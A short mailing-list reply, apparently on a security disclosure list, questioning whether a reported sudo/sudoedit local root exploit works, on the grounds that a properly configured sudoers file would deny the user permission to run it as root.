Subject: Re: Todd Miller Sudo local root exploit discovered by Slouching

Hi Kingcope,

....but if the 'sudoers' file is correctly configured then you would not
have the appropriate sudo permission to run the 'sudoedit' as root.

....of course I'm assuming that the 'sudoers' file has not got the 'run
any command' in it.

If the sudoers file used is even the default then I would think you would
get some error on the lines of:

'Sorry, user is not allowed to execute './sudoedit test' as root on this
machine'.

Aren't you assuming the the sudoers file has a line in it that allows the
user in question to run the /home/myhome/sudoedit as sudo???

Or am I missing something?

Andy
